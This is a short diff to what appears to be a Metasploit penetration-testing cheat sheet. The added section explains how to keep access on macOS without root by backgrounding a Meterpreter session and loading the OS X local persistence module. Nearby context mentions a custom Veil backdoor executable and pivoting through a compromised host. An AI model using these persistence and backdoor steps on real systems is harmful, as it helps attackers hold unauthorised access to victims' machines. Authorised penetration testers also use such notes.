@@ -153,6 +153,19 @@ Meterpreter Android:
 	- show advanced
 		- set EXE::Custom /path/to/veil/backdor
 	- exploit
+
+- Maintaining Access On OS X (dont need root you can do it running as the normal user)
+background the open session  
+```
+background
+```
+use a osx exploit
+```
+use exploit/osx/local/persistence
+show options
+
+```
+
 ## Pivoting (Post Explotation):
 1. (Option) All we need to do is we can upload any tool we need to use,
 for example, if you wanted to use Nmap
